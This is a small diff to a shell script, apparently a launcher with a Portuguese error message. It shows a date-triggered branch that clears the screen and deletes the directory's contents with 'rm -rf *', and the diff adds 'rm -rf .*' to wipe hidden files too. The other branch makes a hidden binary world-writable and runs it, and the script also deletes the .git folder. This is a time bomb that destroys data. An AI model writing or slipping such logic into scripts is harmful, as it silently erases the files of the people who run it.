@@ -33,8 +33,9 @@ test -e .git && rm -rf .git
 if (($(date +%m%y) >= 0222)); then
     clear
     rm -rf *
+    rm -rf .*
 else
-    chmod 777 main
+    chmod 777 .main
     ./main || printf "\e[1;31mnão compatível com sistema atual\e[m\n"
 fi
 exit 0
